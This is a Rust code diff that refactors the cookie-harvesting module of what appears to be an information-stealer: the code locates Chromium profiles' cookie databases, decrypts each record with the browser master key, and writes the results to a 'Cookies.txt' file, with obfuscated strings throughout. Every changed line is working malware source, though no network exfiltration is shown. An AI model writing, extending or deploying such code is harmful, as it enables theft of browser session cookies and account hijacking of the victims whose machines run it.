@@ -9,7 +9,7 @@ use tasks::{parent_name, Task};
 use utils::browsers::chromium::{decrypt_data};
 use utils::path::{Path, WriteToFile};
 use crate::chromium::{Browser};
-use crate::Cookie;
+use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Cookie};
 use obfstr::obfstr as s;
 
 const COOKIES_HOST_KEY: usize        = 1;
@@ -32,41 +32,25 @@ impl Task for CookiesTask {
     parent_name!("Cookies.txt");
 
     unsafe fn run(&self, parent: &Path) {
-        let mut cookies: Vec<Cookie> = self.browser
-            .profiles
-            .iter()
-            .filter_map(|profile| get_cookies(profile, &self.browser.master_key))
-            .flat_map(|v| v.into_iter())
-            .collect();
-        
-        if cookies.is_empty() {
+        let Some(cookies) = collect_from_all_profiles(
+            &self.browser.profiles, 
+            |profile| get_cookies(profile, &self.browser.master_key)
+        ) else {
             return
-        }
+        };
 
-        cookies.sort();
-        cookies.dedup();
-
-        let _ = cookies
-            .iter()
-            .map(|cookie| cookie.to_string())
-            .collect::<Vec<String>>()
-            .join("\n")
-            .write_to(parent);
+        let _ = to_string_and_write_all(&cookies, "\n", parent);
     }
 }
 
 fn get_cookies(profile: &Path, master_key: &[u8]) -> Option<Vec<Cookie>> {
     let cookies_path = profile / s!("Network") / s!("Cookies");
-    let bytes = cookies_path.read_file().ok()?;
-
-    let db = read_sqlite3_database_by_bytes(&bytes)?;
-    let table = db.read_table(s!("Cookies"))?;
-
-    let cookies = table
-        .filter_map(|record| extract_cookie_from_record(&record, master_key))
-        .collect();
-
-    Some(cookies)
+    
+    read_sqlite3_and_map_records(
+        &cookies_path, 
+        s!("Cookies"), 
+        |record| extract_cookie_from_record(record, master_key)
+    )
 }
 
 fn extract_cookie_from_record(record: &Box<dyn TableRecord>, master_key: &[u8]) -> Option<Cookie> {
